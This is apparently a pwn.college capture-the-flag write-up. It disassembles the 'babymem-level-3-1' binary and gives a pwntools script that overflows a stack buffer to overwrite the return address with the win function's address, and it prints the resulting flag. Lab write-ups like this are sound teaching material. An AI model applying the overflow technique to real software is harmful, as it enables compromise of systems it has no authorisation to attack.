# level3.1
## Description
Overflow a buffer and smash the stack to obtain the flag!
## Solution
- The challenge file's name is `babymem-level-3-1`. Running `objdump -d -M intel babymem-level-3-1` inside `/challenge` and looking at the `challenge` function:
```
0000000000401ab2 <challenge>:
  401ab2:       f3 0f 1e fa             endbr64
  401ab6:       55                      push   rbp
  401ab7:       48 89 e5                mov    rbp,rsp
  401aba:       48 81 ec a0 00 00 00    sub    rsp,0xa0
  401ac1:       89 bd 7c ff ff ff       mov    DWORD PTR [rbp-0x84],edi
  401ac7:       48 89 b5 70 ff ff ff    mov    QWORD PTR [rbp-0x90],rsi
  401ace:       48 89 95 68 ff ff ff    mov    QWORD PTR [rbp-0x98],rdx
  401ad5:       48 c7 45 90 00 00 00    mov    QWORD PTR [rbp-0x70],0x0
  401adc:       00 
  401add:       48 c7 45 98 00 00 00    mov    QWORD PTR [rbp-0x68],0x0
  401ae4:       00 
  401ae5:       48 c7 45 a0 00 00 00    mov    QWORD PTR [rbp-0x60],0x0
  401aec:       00 
  401aed:       48 c7 45 a8 00 00 00    mov    QWORD PTR [rbp-0x58],0x0
  401af4:       00 
  401af5:       48 c7 45 b0 00 00 00    mov    QWORD PTR [rbp-0x50],0x0
  401afc:       00 
  401afd:       48 c7 45 b8 00 00 00    mov    QWORD PTR [rbp-0x48],0x0
  401b04:       00 
  401b05:       48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40],0x0
  401b0c:       00 
  401b0d:       48 c7 45 c8 00 00 00    mov    QWORD PTR [rbp-0x38],0x0
  401b14:       00 
  401b15:       48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30],0x0
  401b1c:       00 
  401b1d:       48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  401b24:       00 
  401b25:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
  401b2c:       00 
  401b2d:       c7 45 e8 00 00 00 00    mov    DWORD PTR [rbp-0x18],0x0
  401b34:       66 c7 45 ec 00 00       mov    WORD PTR [rbp-0x14],0x0
  401b3a:       c6 45 ee 00             mov    BYTE PTR [rbp-0x12],0x0
  401b3e:       48 8d 45 90             lea    rax,[rbp-0x70]
  401b42:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  401b46:       48 c7 45 88 00 00 00    mov    QWORD PTR [rbp-0x78],0x0
  401b4d:       00 
  401b4e:       48 8d 3d b7 05 00 00    lea    rdi,[rip+0x5b7]        # 40210c <_IO_stdin_used+0x10c>
  401b55:       b8 00 00 00 00          mov    eax,0x0
  401b5a:       e8 d1 f5 ff ff          call   401130 <printf@plt>
  401b5f:       48 8d 45 88             lea    rax,[rbp-0x78]
  401b63:       48 89 c6                mov    rsi,rax
  401b66:       48 8d 3d ae 05 00 00    lea    rdi,[rip+0x5ae]        # 40211b <_IO_stdin_used+0x11b>
  401b6d:       b8 00 00 00 00          mov    eax,0x0
  401b72:       e8 09 f6 ff ff          call   401180 <__isoc99_scanf@plt>
  401b77:       48 8b 45 88             mov    rax,QWORD PTR [rbp-0x78]
  401b7b:       48 89 c6                mov    rsi,rax
  401b7e:       48 8d 3d 9b 05 00 00    lea    rdi,[rip+0x59b]        # 402120 <_IO_stdin_used+0x120>
  401b85:       b8 00 00 00 00          mov    eax,0x0
  401b8a:       e8 a1 f5 ff ff          call   401130 <printf@plt>
  401b8f:       48 8b 55 88             mov    rdx,QWORD PTR [rbp-0x78]
  401b93:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  401b97:       48 89 c6                mov    rsi,rax
  401b9a:       bf 00 00 00 00          mov    edi,0x0
  401b9f:       e8 ac f5 ff ff          call   401150 <read@plt>
  401ba4:       89 45 f4                mov    DWORD PTR [rbp-0xc],eax
  401ba7:       83 7d f4 00             cmp    DWORD PTR [rbp-0xc],0x0
  401bab:       79 2c                   jns    401bd9 <challenge+0x127>
  401bad:       e8 4e f5 ff ff          call   401100 <__errno_location@plt>
  401bb2:       8b 00                   mov    eax,DWORD PTR [rax]
  401bb4:       89 c7                   mov    edi,eax
  401bb6:       e8 e5 f5 ff ff          call   4011a0 <strerror@plt>
  401bbb:       48 89 c6                mov    rsi,rax
  401bbe:       48 8d 3d 83 05 00 00    lea    rdi,[rip+0x583]        # 402148 <_IO_stdin_used+0x148>
  401bc5:       b8 00 00 00 00          mov    eax,0x0
  401bca:       e8 61 f5 ff ff          call   401130 <printf@plt>
  401bcf:       bf 01 00 00 00          mov    edi,0x1
  401bd4:       e8 b7 f5 ff ff          call   401190 <exit@plt>
  401bd9:       48 8d 3d 8c 05 00 00    lea    rdi,[rip+0x58c]        # 40216c <_IO_stdin_used+0x16c>
  401be0:       e8 2b f5 ff ff          call   401110 <puts@plt>
  401be5:       b8 00 00 00 00          mov    eax,0x0
  401bea:       c9                      leave
  401beb:       c3                      ret
```
- We see that the buffer starts from [rbp-0x70]. This means that there are 112 bytes between the buffer and the saved base pointer. 
- From [level3.0](./level3.0.md)'s hexdump, we can infer that passing a payload of 128 bytes (where the last 8 bytes are the address of the win function) will overwrite the return address with the address of the win function and get the flag.
- From the disassembly, I noted that the win function is at `00000000004019ab`.
- I wrote a python script to generate the payload:
```python
import pwn

padding = b'A' * 120
payload = padding + pwn.p64(0x00000000004019ab)

r = pwn.process('/challenge/babymem-level-3-1')
r.recvuntil('size:')
r.sendline('128')

r.recvuntil('bytes)!')
r.send(payload)
print(r.readall())
```
- Running the script will give us the flag: `pwn.college{06KmMwMATSHuAhmxFvPRIrMBJlX.0FN5IDL5QTO0czW}`.